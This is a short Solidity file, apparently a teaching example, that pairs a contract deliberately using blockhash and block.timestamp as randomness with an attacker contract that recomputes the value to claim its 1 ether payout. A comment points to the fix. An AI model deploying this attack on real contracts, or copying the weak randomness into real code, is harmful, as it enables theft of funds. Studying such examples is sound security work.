// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;  
//pragma solidity ^0.8.0; 
 
                                                       


contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}

contract Attack_Ramdomness {
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {         // For avoiding this attack, don's use block.number & block.timestamp as source of ramdomess
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))       
        );

        guessTheRandomNumber.guess(answer);
    }

    // Helper function to check balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
